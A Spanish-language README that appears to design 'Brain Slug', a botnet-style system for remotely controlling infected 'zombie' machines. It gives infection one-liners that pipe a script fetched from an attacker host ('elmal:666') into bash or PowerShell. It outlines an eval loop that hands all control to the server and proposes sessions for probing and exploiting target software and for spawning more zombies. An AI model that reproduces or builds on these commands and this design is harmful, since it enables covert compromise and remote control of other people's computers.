# Brain Slug

Universal Zombie Control Interface

## Concepto

Brain Slug consta de varias partes más pequeñas:
  * Un código de infección de la máquina que hace un curl | interpreteX
  * Un Y combinator en el interprete seleccionado
  * Una sesión de servidor con la que se puede controla el flujo sin que el cliente tenga ningún tipo de lógica

###Infección

Esta se lleva a cabo a través de un curl:

```bash
curl "http://elmal:666/register" | bash
```

Incluso en windows 10:
```powershell
curl "http://elmal:666/register" | powershell.exe
```

### Combinador Y aplanado

Para que el control de la siguiente instrucción a ejecutar este en el servidor el cliente hará en sus
llamadas el siguiente flujo:

```
operacion, siguiente = eval(codigoLlegadaAlServidor)
while(True):
  eval(operacion)
  operacion, siguiente = eval(siguiente)
```

En siguiente puede estar una nueva llamada al servidor, a otro servidor, o terminar la sesión.

### Sesión de servidor
En la sesión de servidor se gestiona para cada cliente su estado en la ejecución. De forma que 
cuando un cliente pregunte por la siguiente operación a ejecutar el servidor se lo da de forma
correcta.

A parte de ejecutar operaciones el servidor siempre debe enviar la siguiente instrucción para
que el Y combinator pueda funcionar.

Las operaciones pueden enviar como respuesta a las ejecuciones el resultado de la evaluación
de la operación al servidor para que se guarden en el servidor. O pueden enviar otra orden 
para que se guarden en la memoría del cliente. De esta forma el estado esta compartido entre
ambos sistemas pero el control de flujo esta completamente del lado del servidor.

Todo el código ejecutado desde el servidor debe estar traspilado al interprete del cliente, en
una primera versión se hará un recetario con plantillas como validar la prueba de concepto.


## Ideas secundarias
Se puede tener una sesión de parking con los clientes zombies para los que no se tenga
todavía trabajo de forma que ocupen pocos recursos y nos aseguremos que no se pierde el 
contacto con los mismos.

Se pueden tener diferentes flujos y sesiones de forma que un zombie pueda ejecutar diferentes
"caminos" de ejecución dependiendo de su naturaleza. Por ejemplo, una sesión que detecte
si existe un software en la máquina objetivo y otra sesión especializada en su explotación.

Se pueden tener meta sesiones que orquesten multi tareas en un zombie o multi zombie. Para
esto se necesita abrir un fork en la máquina remota que instancie un nuevo zombie.
